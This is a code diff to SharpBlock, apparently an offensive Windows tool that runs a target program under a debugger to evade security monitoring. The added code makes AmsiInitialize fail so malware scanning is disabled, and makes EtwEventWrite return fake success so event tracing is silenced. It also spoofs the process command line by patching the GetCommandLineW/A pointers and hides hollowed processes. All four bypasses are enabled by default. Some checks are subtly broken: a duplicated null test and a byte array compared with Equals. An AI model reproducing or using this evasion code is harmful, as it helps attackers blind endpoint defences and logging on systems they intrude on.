@@ -35,6 +35,7 @@ namespace SharpBlock {
         static List<string> blockProduct = new List<string>();
 
         static IntPtr amsiInitalizePtr;
+        static IntPtr getCommandLineWPtr;
 
         private static IntPtr GetIntPtrFromByteArray(byte[] byteArray) {
             GCHandle pinnedArray = GCHandle.Alloc(byteArray, GCHandleType.Pinned);
@@ -129,32 +130,83 @@ namespace SharpBlock {
             return dllPath.ToString();
         }
 
-        static void DisableAMSI(IntPtr hThread, IntPtr hProcess) {
+        static void OverrideReturnValue(IntPtr hThread, IntPtr hProcess, IntPtr value) {
 
             Context64 ctx = new Context64(ContextFlags.All);
             ctx.GetContext(hThread);
 
             //Reads the memory for the current stack pointer to get the return address
             ctx.Ip = ctx.GetCurrentReturnAddress(hProcess);
-            //Restore the stack pointer to the prior state before AmsiInitalize was called
+            //Restore the stack pointer to the prior state before the function was called
             ctx.PopStackPointer();
-            //Set the return value register to indicate AMSI is disabled
-            ctx.SetResultRegister(0x80070002);
+            //Set the result
+            ctx.SetResultRegister((ulong)value.ToInt64());
 
             ctx.SetContext(hThread);
         }
 
-        static void SetHardwareBreakpoint(IntPtr hThread, IntPtr address) {
+        static IntPtr ReadRipRelRaxPointer(IntPtr hProcess, IntPtr address) {
 
-            Context64 ctx = new Context64(ContextFlags.Debug);
+            byte[] movIns = ReadBytes(hProcess, address, 3);
+
+            if (movIns.Equals(new byte[] { 0x48, 0x8b, 0x05 })) {
+                return IntPtr.Zero;
+            }
+
+            return new IntPtr(address.ToInt64() + 7 + ReadType<Int32>(hProcess, new IntPtr(address.ToInt64() + 3)));
+        }
+
+        static IntPtr WriteProgramArgs(IntPtr hProcess, string args) {
+
+            //We need room for ANSI and Unicode representation of args
+            IntPtr regionSize = new IntPtr(args.Length * 2 + 2 + args.Length + 1);
+            IntPtr remoteArgAddress = IntPtr.Zero;
+            byte[] argBytesUnicode = Encoding.Unicode.GetBytes(args);
+            byte[] argBytesANSI = Encoding.ASCII.GetBytes(args);
+            IntPtr bytesWritten;
+
+            remoteArgAddress = Execute.DynamicInvoke.Native.NtAllocateVirtualMemory(hProcess, ref remoteArgAddress, IntPtr.Zero, ref regionSize, 0x00001000, (int)4);
+            
+            WinAPI.WriteProcessMemory(hProcess, remoteArgAddress, argBytesUnicode, argBytesUnicode.Length, out bytesWritten);
+            WinAPI.WriteProcessMemory(hProcess, new IntPtr(remoteArgAddress.ToInt64() + argBytesUnicode.Length + 2), argBytesANSI, argBytesANSI.Length, out bytesWritten);
+
+            return remoteArgAddress;
+        }
+
+        static void UpdateCommandLine(IntPtr hProcess, string args) {
+
+            IntPtr kernel32Base = WinAPI.LoadLibrary("kernelbase.dll");
+            IntPtr commandLineArgsWPtr = ReadRipRelRaxPointer(hProcess, WinAPI.GetProcAddress(kernel32Base, "GetCommandLineW"));
+            IntPtr commandLineArgsAPtr = ReadRipRelRaxPointer(hProcess, WinAPI.GetProcAddress(kernel32Base, "GetCommandLineA"));
+
+            if(commandLineArgsAPtr == IntPtr.Zero || commandLineArgsAPtr == IntPtr.Zero) {
+                Console.WriteLine("[-] Failed to updated GetCommandLine pointers, unexpected instruction present");
+                return;
+            }
+
+            IntPtr argsStartPtr = WriteProgramArgs(hProcess, args);
+
+            WritePointer(hProcess, commandLineArgsWPtr, argsStartPtr);
+            WritePointer(hProcess, commandLineArgsAPtr, new IntPtr(argsStartPtr.ToInt64() + args.Length * 2 + 2));
+            Console.WriteLine($"[+] Updated command line args with {args}");
+        }
+
+        static void DisableAMSI(IntPtr hThread, IntPtr hProcess) {
+            //Set result of AmsiInitialize to indicate disabled.
+            OverrideReturnValue(hThread, hProcess, new IntPtr(0x80070002));  
+        }
+
+        static void SetHardwareBreakpoint(IntPtr hThread, IntPtr address, int index) {
+
+            Context64 ctx = new Context64(ContextFlags.All);
             ctx.GetContext(hThread);
 
             if (ctx.Ip != (ulong)address.ToInt64()) {
-                ctx.EnableBreakpoint(address);
+                ctx.EnableBreakpoint(address, index);
             } else {
                 // If our BP address matches the thread context address
                 // then we have hit the HBP, so we need to disable
-                // DR0 and enabled single step so that we break at the
+                // HBP and enabled single step so that we break at the
                 // next instruction and re-eable the HBP.
                 ctx.EnableSingleStep();
             }
@@ -162,20 +214,25 @@ namespace SharpBlock {
             ctx.SetContext(hThread);
         }
 
-        static void ClearHardwareBreakpoints(IEnumerable<IntPtr> handles) {
+        static void ClearHardwareBreakpoint(IntPtr thread, int index) {
+            Context64 ctx = new Context64(ContextFlags.Debug);
+            ctx.GetContext(thread);
+            ctx.ClearBreakpoint(index);
+            ctx.SetContext(thread);
+        }
+
+        static void ClearHardwareBreakpoints(IEnumerable<IntPtr> handles, int index) {
             foreach (IntPtr thread in handles) {
-                Context64 ctx = new Context64(ContextFlags.Debug);
-                ctx.GetContext(thread);
-                ctx.ClearBreakpoint();
-                ctx.SetContext(thread);
+                ClearHardwareBreakpoint(thread, index);
             }
         }
 
-        static void EnableHardwareBreakpoints(IEnumerable<IntPtr> handles, IntPtr address) {
+        static void EnableHardwareBreakpoints(IEnumerable<IntPtr> handles, IntPtr address, int index) {
             foreach (IntPtr thread in handles) {
                 Context64 ctx = new Context64(ContextFlags.Debug);
                 ctx.GetContext(thread);
-                ctx.EnableBreakpoint(address);
+                ctx.EnableBreakpoint(address, index);
+                ctx.SetContext(thread);
             }
         }
 
@@ -293,6 +350,16 @@ namespace SharpBlock {
             }
 
             return data;
+        }
+
+        static byte[] ReadBytes(IntPtr hProcess, IntPtr address, int size) {
+            uint bytesRead = (uint)size;
+            IntPtr buffer = Marshal.AllocHGlobal(size);
+            Execute.DynamicInvoke.Native.NtReadVirtualMemory(hProcess, address, buffer, ref bytesRead);
+            byte[] result = new byte[bytesRead];
+            Marshal.Copy(buffer, result, 0, (int)bytesRead);
+            Marshal.FreeHGlobal(buffer);
+            return result;
         }
 
         static IntPtr ReadPointer (IntPtr hProcess, IntPtr address) {
@@ -413,15 +480,20 @@ namespace SharpBlock {
             WritePointer(hProcess, new IntPtr(peb + 0x10), remoteImage);
                        
             return hpi;
-        }        
-
+        }   
+        
         static void Main(string[] args) {
 
             string program = "c:\\windows\\system32\\cmd.exe";
             string hostProcess = null;
             string programArgs = "";
             bool showHelp = false;
-            bool bypass = false;
+            bool bypassAmsi = true;
+            bool bypassCommandLine = true;
+            bool bypassETW = true;
+            bool bypassHollowDetect = true;
+            bool patchedArgs = false;
+            bool kernelBaseLoaded = false;
             HostProcessInfo hpi = new HostProcessInfo();
 
             Console.WriteLine(
@@ -436,8 +508,11 @@ namespace SharpBlock {
                 .Add("c=|copyright=", "Copyright string to block", v => blockCopyright.Add(v))
                 .Add("p=|product=", "Product string to block", v => blockProduct.Add(v))
                 .Add("d=|description=", "Description string to block", v => blockDescription.Add(v))
-                .Add("b=|bypass=", "Bypasses AMSI within the executed process (true|false)", v => bypass = v != null)
                 .Add("s=|spawn=", "Host process to spawn for swapping with the target exe", v => hostProcess = v)
+                .Add("disable-bypass-amsi", "Disable AMSI bypassAmsi", v => bypassAmsi = false)
+                .Add("disable-bypass-cmdline", "Disable command line bypass", v => bypassCommandLine = false)
+                .Add("disable-bypass-etw", "Disable ETW bypass", v => bypassETW = false)
+                .Add("disable-header-patch", "Disable process hollow detection bypass", v => bypassHollowDetect = false)
                 .Add("h|help", "Display this help", v => showHelp = v != null);
 
             try {
@@ -460,7 +535,11 @@ namespace SharpBlock {
                 IntPtr amsiBase = WinAPI.LoadLibrary("amsi.dll");
                 amsiInitalizePtr = WinAPI.GetProcAddress(amsiBase, "AmsiInitialize");
 
-                Console.WriteLine($"[+] in-proc AMSI 0x{amsiBase.ToInt64():x16}");
+                IntPtr ntdllBase = WinAPI.LoadLibrary("ntdll.dll");
+                IntPtr etwEventWritePtr = WinAPI.GetProcAddress(ntdllBase, "EtwEventWrite");
+
+                Console.WriteLine($"[+] in-proc amsi 0x{amsiBase.ToInt64():x16}");
+                Console.WriteLine($"[+] in-proc ntdll 0x{ntdllBase.ToInt64():x16}");
 
                 IntPtr stdOut;
                 IntPtr stdErr;
@@ -480,14 +559,16 @@ namespace SharpBlock {
 
                 PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
 
-                if (!CreateProcess(hostProcess != null ? hostProcess : program, $"\"{hostProcess}\" {programArgs}", IntPtr.Zero, IntPtr.Zero, true, WinAPI.DEBUG_PROCESS, IntPtr.Zero, null,
+                string realProgramArgs = $"\"{hostProcess}\" {programArgs}";
+                string launchedArgs = bypassCommandLine ? $"\"{hostProcess}\"" : realProgramArgs;
+
+                if (!CreateProcess(hostProcess != null ? hostProcess : program, launchedArgs, IntPtr.Zero, IntPtr.Zero, true, WinAPI.DEBUG_PROCESS | 0x08000000, IntPtr.Zero, null,
                     ref startupInfo, out pi)) {
                     Console.WriteLine($"[!] Failed to create process { (hostProcess != null ? hostProcess : program) } with error {Marshal.GetLastWin32Error()}");
                     return;
                 }
 
-                Console.WriteLine($"[+] Launched process { (hostProcess != null ? hostProcess : program)} with PID {pi.dwProcessId}");
-
+                Console.WriteLine($"[+] Launched process { (hostProcess != null ? hostProcess : program)} with PID {pi.dwProcessId}");               
                 bool bContinueDebugging = true;
                 Dictionary<uint, IntPtr> processHandles = new Dictionary<uint, IntPtr>();
                 Dictionary<uint, IntPtr> threadHandles = new Dictionary<uint, IntPtr>();
@@ -501,7 +582,7 @@ namespace SharpBlock {
                         IntPtr debugInfoPtr = GetIntPtrFromByteArray(DebugEvent.u);
                         switch (DebugEvent.dwDebugEventCode) {
 
-                            /* Uncomment if you want to set OutputDebugString output
+                            /* Uncomment if you want to see OutputDebugString output
                             case WinAPI.OUTPUT_DEBUG_STRING_EVENT:
                                 WinAPI.OUTPUT_DEBUG_STRING_INFO OutputDebugStringEventInfo = (WinAPI.OUTPUT_DEBUG_STRING_INFO)Marshal.PtrToStructure(debugInfoPtr, typeof(WinAPI.OUTPUT_DEBUG_STRING_INFO));
                                 IntPtr bytesRead;
@@ -517,16 +598,21 @@ namespace SharpBlock {
                                 processHandles[DebugEvent.dwProcessId] = CreateProcessDebugInfo.hProcess;
                                 threadHandles[DebugEvent.dwThreadId] = CreateProcessDebugInfo.hThread;
 
-                                if (bypass)
-                                    SetHardwareBreakpoint(CreateProcessDebugInfo.hThread, amsiInitalizePtr);
+                                if (bypassAmsi)
+                                    SetHardwareBreakpoint(CreateProcessDebugInfo.hThread, amsiInitalizePtr, 0);
 
                                 break;
                             case WinAPI.CREATE_THREAD_DEBUG_EVENT:
                                 WinAPI.CREATE_THREAD_DEBUG_INFO CreateThreadDebugInfo = (WinAPI.CREATE_THREAD_DEBUG_INFO)Marshal.PtrToStructure(debugInfoPtr, typeof(WinAPI.CREATE_THREAD_DEBUG_INFO));
                                 threadHandles[DebugEvent.dwThreadId] = CreateThreadDebugInfo.hThread;
 
-                                if (bypass)
-                                    SetHardwareBreakpoint(CreateThreadDebugInfo.hThread, amsiInitalizePtr);
+                                if (pi.dwProcessId == DebugEvent.dwProcessId) {
+                                    if (bypassAmsi)
+                                        SetHardwareBreakpoint(CreateThreadDebugInfo.hThread, amsiInitalizePtr, 0);
+
+                                    if(bypassETW)
+                                        SetHardwareBreakpoint(threadHandles[DebugEvent.dwThreadId], etwEventWritePtr, 2);
+                                }
 
                                 break;
                             case WinAPI.EXIT_PROCESS_DEBUG_EVENT:
@@ -538,18 +624,34 @@ namespace SharpBlock {
                                 WinAPI.LOAD_DLL_DEBUG_INFO LoadDLLDebugInfo = (WinAPI.LOAD_DLL_DEBUG_INFO)Marshal.PtrToStructure(debugInfoPtr, typeof(WinAPI.LOAD_DLL_DEBUG_INFO));
                                 string dllPath = PatchEntryPointIfNeeded(LoadDLLDebugInfo.hFile, LoadDLLDebugInfo.lpBaseOfDll, processHandles[DebugEvent.dwProcessId]);
 
-                                if (DebugEvent.dwProcessId == pi.dwProcessId && hostProcess != null && dllPath.EndsWith("ntdll.dll", StringComparison.OrdinalIgnoreCase)) {
-                                    Console.WriteLine($"[+] Replacing host process with {program}");
-                                    hpi = ReplaceExecutable(processHandles[DebugEvent.dwProcessId], threadHandles[DebugEvent.dwThreadId], program);
+                                if (DebugEvent.dwProcessId == pi.dwProcessId) {
 
-                                    //Once we have hollowed out our process we put a breakpoint on 
-                                    //our in-memory PE entry point.  
-                                    //Once the entry point is hit it means that we can then attempt to 
-                                    //hide our PE from prying eyes.
-                                    SetHardwareBreakpoint(threadHandles[DebugEvent.dwThreadId], hpi.newEntryPoint);
+                                    // Once kernelbase.dll has loaded then update GetCommandLineW/A args
+                                    if (bypassCommandLine && kernelBaseLoaded && !patchedArgs) {
+                                        UpdateCommandLine(pi.hProcess, realProgramArgs);
+                                        patchedArgs = true;
+                                    }
+
+                                    if (hostProcess != null && dllPath.EndsWith("ntdll.dll", StringComparison.OrdinalIgnoreCase)) {
+                                        Console.WriteLine($"[+] Replacing host process with {program}");
+                                        hpi = ReplaceExecutable(processHandles[DebugEvent.dwProcessId], threadHandles[DebugEvent.dwThreadId], program);
+
+                                        //Set a breakpoint on EtwEventWrite ready for us to bypass
+                                        SetHardwareBreakpoint(threadHandles[DebugEvent.dwThreadId], etwEventWritePtr, 2);
+
+                                        //Once we have hollowed out our process we put a breakpoint on 
+                                        //our in-memory PE entry point.  
+                                        //Once the entry point is hit it means that we can then attempt to 
+                                        //hide our PE from prying eyes.
+                                        SetHardwareBreakpoint(threadHandles[DebugEvent.dwThreadId], hpi.newEntryPoint, 1);
+
+                                    } else if (dllPath.EndsWith("kernelbase.dll", StringComparison.OrdinalIgnoreCase)) {
+                                        kernelBaseLoaded = true;
+                                    }
                                 }
 
                                 break;
+
                             case WinAPI.EXCEPTION_DEBUG_EVENT:
                                 WinAPI.EXCEPTION_DEBUG_INFO ExceptionDebugInfo = (WinAPI.EXCEPTION_DEBUG_INFO)Marshal.PtrToStructure(debugInfoPtr, typeof(WinAPI.EXCEPTION_DEBUG_INFO));
 
@@ -560,23 +662,36 @@ namespace SharpBlock {
                                         //It is, to update the thread context to return to caller with 
                                         //an invalid result
                                         DisableAMSI(threadHandles[DebugEvent.dwThreadId], processHandles[DebugEvent.dwProcessId]);
-                                        //Opsec purposes, lets now clear all threads of hardware breakpoints
-                                        ClearHardwareBreakpoints(threadHandles.Values.ToArray());
+                                        
+                                        //Set the hardware breakpoint again for AmsiInitalize
+                                        SetHardwareBreakpoint(threadHandles[DebugEvent.dwThreadId], amsiInitalizePtr, 0);
 
                                         //check to see if we have hit our in-memory PE entry-point
                                     } else if (ExceptionDebugInfo.ExceptionRecord.ExceptionAddress == hpi.newEntryPoint) {
 
-                                        HideHollowedProcess(pi.hProcess, hpi);
+                                        //Causes crashes on some processes, for example cmd.exe, use --bypass-header-patch to disable
+                                        if(bypassHollowDetect)
+                                            HideHollowedProcess(pi.hProcess, hpi);
+                                        
+                                        //Catch case just in case kernelbase was the last DLL loaded
+                                        if (bypassCommandLine && kernelBaseLoaded && !patchedArgs) {
+                                            UpdateCommandLine(pi.hProcess, realProgramArgs);
+                                            patchedArgs = true;
+                                        }
 
-                                        Context64 ctx = new Context64(ContextFlags.Debug);
-                                        ctx.ClearBreakpoint();
-                                        ctx.SetContext(threadHandles[DebugEvent.dwThreadId]);
+                                        //No longer need the entrypoint breakpoint
+                                        ClearHardwareBreakpoint(threadHandles[DebugEvent.dwThreadId], 1);
+
+                                    }else if(ExceptionDebugInfo.ExceptionRecord.ExceptionAddress == etwEventWritePtr) {
+                                        //We have hit EtwEventWrite so lets just return with a fake success result
+                                        OverrideReturnValue(threadHandles[DebugEvent.dwThreadId], processHandles[DebugEvent.dwProcessId], new IntPtr(0));
                                     }
 
                                 } else {
                                     dwContinueDebugEvent = WinAPI.DBG_EXCEPTION_NOT_HANDLED;
                                 }
 
+                                //Console.WriteLine($"Exception 0x{ExceptionDebugInfo.ExceptionRecord.ExceptionCode:x} occured at 0x{ExceptionDebugInfo.ExceptionRecord.ExceptionAddress.ToInt64():x}");
                                 break;
                         }
 
